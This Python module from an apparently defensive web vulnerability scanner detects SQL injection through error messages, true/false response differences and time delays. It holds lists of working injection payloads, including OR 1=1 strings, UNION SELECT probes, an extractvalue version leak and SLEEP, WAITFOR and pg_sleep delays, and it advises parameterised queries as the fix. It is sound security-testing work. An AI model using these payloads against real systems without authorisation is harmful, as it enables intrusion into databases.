"""SQL Injection detection module.

Implements three detection strategies:
  1. Error-based  — trigger DB error messages with malformed input.
  2. Boolean-based blind — compare page content between always-true and
     always-false conditions.
  3. Time-based blind — measure response delay caused by SLEEP/WAITFOR payloads.

Injection modes
---------------
  - Replace: the entire parameter value is replaced by the payload.
  - Append:  the payload is appended to the original value.

The append mode is critical for numeric parameters (e.g. ``id=1``).
Injecting ``'`` in replace mode gives ``id=``'`` — syntactically valid SQL that
returns empty results without any error.  Injecting in append mode gives
``id=1'`` — a genuine syntax error that exposes the vulnerability.
"""

import re
import time
from typing import Dict, List, Optional, Tuple

import logging

from .base import BaseModule, Finding
from ..parser import rebuild_url_with_params

logger = logging.getLogger("vulnscanner")

# ---------------------------------------------------------------------------
# DB error signatures  (pattern, DBMS label)
# ---------------------------------------------------------------------------
_ERROR_SIGS: List[Tuple[str, str]] = [
    (r"you have an error in your sql syntax", "MySQL"),
    (r"warning:\s*mysql", "MySQL"),
    (r"mysql_fetch", "MySQL"),
    (r"supplied argument is not a valid mysql", "MySQL"),
    (r"column count doesn't match value count", "MySQL"),
    (r"unclosed quotation mark", "MSSQL"),
    (r"incorrect syntax near", "MSSQL"),
    (r"microsoft sql server", "MSSQL"),
    (r"\[microsoft\]\[odbc", "MSSQL"),
    (r"mssql_query\(\)", "MSSQL"),
    (r"ora-\d{4,5}", "Oracle"),
    (r"oracle error", "Oracle"),
    (r"oracle.*driver", "Oracle"),
    (r"sqlite3::", "SQLite"),
    (r"sqlite\.exception", "SQLite"),
    (r"syntax error.*sqlite", "SQLite"),
    (r"pg_query\(\)", "PostgreSQL"),
    (r"postgresql.*error", "PostgreSQL"),
    (r"valid postgresql result", "PostgreSQL"),
    (r"psql.*error", "PostgreSQL"),
    (r"division by zero", "Generic"),
    (r"sql syntax.*mysql", "MySQL"),
    (r"warning.*mysql_", "MySQL"),
]

# ---------------------------------------------------------------------------
# Error-based payloads
# ---------------------------------------------------------------------------

# Appended to the original value — critical for numeric parameters.
# e.g. original "1"  →  injected "1'"   →  SQL: WHERE id=1'  (syntax error)
_APPEND_ERROR_SUFFIXES: List[str] = [
    "'",
    '"',
    "\\",
    "'--",
    "'#",
    "' --",
    "'/*",
    "') --",
    "')) --",
]

# Replace-mode payloads — replace the value entirely.
# Better suited for string parameters or when we don't know the original value.
_REPLACE_ERROR_PAYLOADS: List[str] = [
    "'",
    '"',
    "\\",
    "'--",
    "'#",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' GROUP BY columnnames HAVING 1=1--",
    "1 AND 1=CONVERT(int,(SELECT @@version))--",
    "1' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
]

# ---------------------------------------------------------------------------
# Boolean-based blind payloads
# ---------------------------------------------------------------------------

# Append-mode AND pairs — ideal for numeric params.
# TRUE:  id=1 AND 1=1  →  same result as baseline
# FALSE: id=1 AND 1=2  →  empty / fewer results
_APPEND_AND_PAIRS: List[Tuple[str, str]] = [
    (" AND 1=1",          " AND 1=2"),
    (" AND 1=1--",        " AND 1=2--"),
    (" AND 1=1#",         " AND 1=2#"),
    (" AND 'a'='a'--",    " AND 'a'='b'--"),
    (") AND (1=1",        ") AND (1=2"),
    (") AND (1=1)--",     ") AND (1=2)--"),
]

# Replace-mode pairs — better for string parameters.
_REPLACE_BOOL_PAIRS: List[Tuple[str, str]] = [
    ("' OR '1'='1",         "' OR '1'='2"),
    ("' OR 1=1--",          "' OR 1=2--"),
    ("1' OR '1'='1'--",     "1' OR '1'='2'--"),
    ("\" OR \"1\"=\"1\"--", "\" OR \"1\"=\"2\"--"),
    ("1 OR 1=1",            "1 OR 1=2"),
    ("' OR 'x'='x",         "' OR 'x'='y"),
    ("1) OR (1=1)--",       "1) OR (1=2)--"),
]

# ---------------------------------------------------------------------------
# Time-based blind payloads
# ---------------------------------------------------------------------------

# (template with {delay} and optional {orig} placeholder, DBMS label, append?)
# append=True → suffix appended to original value
# append=False → value replaced entirely
_TIME_PAYLOADS: List[Tuple[str, str, bool]] = [
    # Append-mode (numeric-safe)
    (" AND SLEEP({delay})--",             "MySQL",      True),
    (" AND SLEEP({delay})#",              "MySQL",      True),
    (" OR SLEEP({delay})--",              "MySQL",      True),
    (" OR SLEEP({delay})#",               "MySQL",      True),
    ("; WAITFOR DELAY '0:0:{delay}'--",   "MSSQL",      True),
    ("; SELECT pg_sleep({delay})--",      "PostgreSQL", True),
    # Replace-mode fallbacks
    ("' OR SLEEP({delay})--",             "MySQL",      False),
    ("1 OR SLEEP({delay})",               "MySQL",      False),
    ("' AND SLEEP({delay}) AND '1'='1",   "MySQL",      False),
    ("'; WAITFOR DELAY '0:0:{delay}'--",  "MSSQL",      False),
    ("'; SELECT pg_sleep({delay})--",     "PostgreSQL", False),
]


class SQLiScanner(BaseModule):
    """Detects SQL injection via error-based, boolean-based, and time-based methods."""

    NAME = "sqli"

    def __init__(self, http_client, config: Dict) -> None:
        super().__init__(http_client, config)
        self.delay = float(config.get("delay_threshold", 5.0))
        self.custom_payloads: Optional[str] = config.get("custom_payloads")

    # ------------------------------------------------------------------
    # Public entry-point
    # ------------------------------------------------------------------

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        """Run all three SQLi detection strategies against *param_name*."""
        finding = (
            self._test_error_based(url, method, params, param_name)
            or self._test_boolean_based(url, method, params, param_name)
            or self._test_time_based(url, method, params, param_name)
        )
        return [finding] if finding else []

    # ------------------------------------------------------------------
    # Injection helpers
    # ------------------------------------------------------------------

    def _replace(self, params: Dict, name: str, payload: str) -> Dict:
        """Return params with *name* replaced by *payload*."""
        return {**params, name: payload}

    def _append(self, params: Dict, name: str, suffix: str) -> Dict:
        """Return params with *suffix* appended to the existing value of *name*."""
        return {**params, name: params.get(name, "") + suffix}

    def _send(self, url: str, method: str, params: Dict[str, str]):
        if method == "GET":
            return self.http.get(rebuild_url_with_params(url, params))
        return self.http.post(url, data=params)

    # ------------------------------------------------------------------
    # Strategy 1: Error-based
    # ------------------------------------------------------------------

    def _test_error_based(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> Optional[Finding]:
        """Inject malformed SQL and look for DB error messages in the response.

        Tests append-mode first (critical for numeric parameters like id=1),
        then falls back to replace-mode payloads.
        """
        # Append-mode: e.g. id=1 → id=1'
        for suffix in _APPEND_ERROR_SUFFIXES:
            injected_params = self._append(params, param_name, suffix)
            finding = self._check_error_response(
                url, method, injected_params, param_name,
                display_payload=f"{params.get(param_name, '')}{suffix}",
            )
            if finding:
                return finding

        # Replace-mode: e.g. id=' OR '1'='1
        for payload in self.load_payloads(_REPLACE_ERROR_PAYLOADS, self.custom_payloads):
            injected_params = self._replace(params, param_name, payload)
            finding = self._check_error_response(
                url, method, injected_params, param_name,
                display_payload=payload,
            )
            if finding:
                return finding

        return None

    def _check_error_response(
        self,
        url: str,
        method: str,
        injected_params: Dict,
        param_name: str,
        display_payload: str,
    ) -> Optional[Finding]:
        """Send one request and check the response for SQL error signatures."""
        resp = self._send(url, method, injected_params)
        if resp is None:
            return None

        body_lower = resp.text.lower()
        for pattern, dbms in _ERROR_SIGS:
            if re.search(pattern, body_lower, re.IGNORECASE):
                match = re.search(pattern, body_lower, re.IGNORECASE)
                start = max(0, match.start() - 30)
                end = min(len(resp.text), match.end() + 80)
                snippet = resp.text[start:end].replace("\n", " ").strip()

                logger.debug(
                    "[SQLi/Error] %s=%r matched pattern=%r (%s)",
                    param_name, display_payload, pattern, dbms,
                )
                return Finding(
                    vuln_type="SQL Injection (Error-based)",
                    url=url,
                    method=method,
                    parameter=param_name,
                    payload=display_payload,
                    evidence=f'DB error signature "{pattern}" ({dbms}): ...{snippet!r}...',
                    confidence="high",
                    details=(
                        f"{dbms} error exposed in HTTP response. "
                        f"Payload: {display_payload!r}. "
                        "Remediation: use parameterised queries / prepared statements."
                    ),
                )
        return None

    # ------------------------------------------------------------------
    # Strategy 2: Boolean-based blind
    # ------------------------------------------------------------------

    def _test_boolean_based(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> Optional[Finding]:
        """Compare responses for always-true vs always-false SQL conditions.

        Tests append-mode AND pairs first (numeric-safe), then replace-mode OR pairs.
        """
        baseline = self._send(url, method, params)
        if baseline is None:
            return None
        baseline_len = len(baseline.text)

        # Tolerance: within 10 % of baseline (min 30 bytes) counts as "same"
        tolerance = max(30, int(baseline_len * 0.10))
        # Meaningful difference: at least 10 % of baseline (min 50 bytes)
        min_diff = max(50, int(baseline_len * 0.10))

        # --- Append-mode AND pairs (numeric-safe) ---
        for true_sfx, false_sfx in _APPEND_AND_PAIRS:
            orig = params.get(param_name, "")
            true_pl  = f"{orig}{true_sfx}"
            false_pl = f"{orig}{false_sfx}"

            r_true  = self._send(url, method, self._append(params, param_name, true_sfx))
            r_false = self._send(url, method, self._append(params, param_name, false_sfx))

            if r_true is None or r_false is None:
                continue

            finding = self._evaluate_bool_pair(
                url, method, param_name, baseline_len, tolerance, min_diff,
                r_true, r_false, true_pl, false_pl,
            )
            if finding:
                return finding

        # --- Replace-mode OR pairs ---
        for true_pl, false_pl in _REPLACE_BOOL_PAIRS:
            r_true  = self._send(url, method, self._replace(params, param_name, true_pl))
            r_false = self._send(url, method, self._replace(params, param_name, false_pl))

            if r_true is None or r_false is None:
                continue

            finding = self._evaluate_bool_pair(
                url, method, param_name, baseline_len, tolerance, min_diff,
                r_true, r_false, true_pl, false_pl,
            )
            if finding:
                return finding

        return None

    def _evaluate_bool_pair(
        self,
        url: str,
        method: str,
        param_name: str,
        baseline_len: int,
        tolerance: int,
        min_diff: int,
        r_true,
        r_false,
        true_pl: str,
        false_pl: str,
    ) -> Optional[Finding]:
        """Determine if the true/false response pair signals blind SQLi."""
        t_len = len(r_true.text)
        f_len = len(r_false.text)
        diff  = abs(t_len - f_len)

        true_near_baseline  = abs(t_len - baseline_len) <= tolerance
        false_near_baseline = abs(f_len - baseline_len) <= tolerance

        # Pattern A: TRUE ≈ baseline, FALSE diverges  (AND injection)
        pattern_a = true_near_baseline and diff >= min_diff
        # Pattern B: FALSE ≈ baseline, TRUE diverges  (OR injection expands results)
        pattern_b = false_near_baseline and diff >= min_diff
        # Pattern C: status codes differ
        pattern_c = r_true.status_code != r_false.status_code

        if pattern_a or pattern_b or pattern_c:
            kind = "AND" if pattern_a else ("OR" if pattern_b else "status-code")
            logger.debug(
                "[SQLi/Boolean/%s] %s: baseline=%d true=%d false=%d diff=%d",
                kind, param_name, baseline_len, t_len, f_len, diff,
            )
            return Finding(
                vuln_type="SQL Injection (Boolean-based Blind)",
                url=url,
                method=method,
                parameter=param_name,
                payload=f"TRUE: {true_pl!r}  /  FALSE: {false_pl!r}",
                evidence=(
                    f"Response length: TRUE={t_len} B, FALSE={f_len} B "
                    f"(diff={diff} B, baseline={baseline_len} B, pattern={kind})"
                ),
                confidence="medium",
                details=(
                    f"Boolean-based blind SQLi ({kind} pattern). "
                    f"Baseline: {baseline_len} B | TRUE: {t_len} B | FALSE: {f_len} B. "
                    "Remediation: use parameterised queries / prepared statements."
                ),
            )
        return None

    # ------------------------------------------------------------------
    # Strategy 3: Time-based blind
    # ------------------------------------------------------------------

    def _test_time_based(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> Optional[Finding]:
        """Measure response delay caused by SLEEP / WAITFOR / pg_sleep payloads."""
        t0 = time.perf_counter()
        baseline_resp = self._send(url, method, params)
        baseline_time = time.perf_counter() - t0
        if baseline_resp is None:
            return None

        delay_sec = int(self.delay)

        for template, dbms, append_mode in _TIME_PAYLOADS:
            suffix_or_payload = template.format(delay=delay_sec)

            if append_mode:
                injected = self._append(params, param_name, suffix_or_payload)
                display  = f"{params.get(param_name, '')}{suffix_or_payload}"
            else:
                injected = self._replace(params, param_name, suffix_or_payload)
                display  = suffix_or_payload

            t0 = time.perf_counter()
            resp = self._send(url, method, injected)
            elapsed = time.perf_counter() - t0

            if resp is None:
                continue

            if elapsed >= self.delay and elapsed >= (baseline_time + self.delay * 0.8):
                logger.debug(
                    "[SQLi/Time] %s=%r elapsed=%.2fs baseline=%.2fs (%s)",
                    param_name, display, elapsed, baseline_time, dbms,
                )
                return Finding(
                    vuln_type="SQL Injection (Time-based Blind)",
                    url=url,
                    method=method,
                    parameter=param_name,
                    payload=display,
                    evidence=(
                        f"Response delayed {elapsed:.2f}s with {delay_sec}s sleep payload "
                        f"(baseline: {baseline_time:.2f}s, DBMS hint: {dbms})"
                    ),
                    confidence="medium",
                    details=(
                        f"Time-based blind SQLi ({dbms}): payload caused {elapsed:.2f}s "
                        f"delay vs {baseline_time:.2f}s baseline. "
                        "Remediation: use parameterised queries / prepared statements."
                    ),
                )
        return None
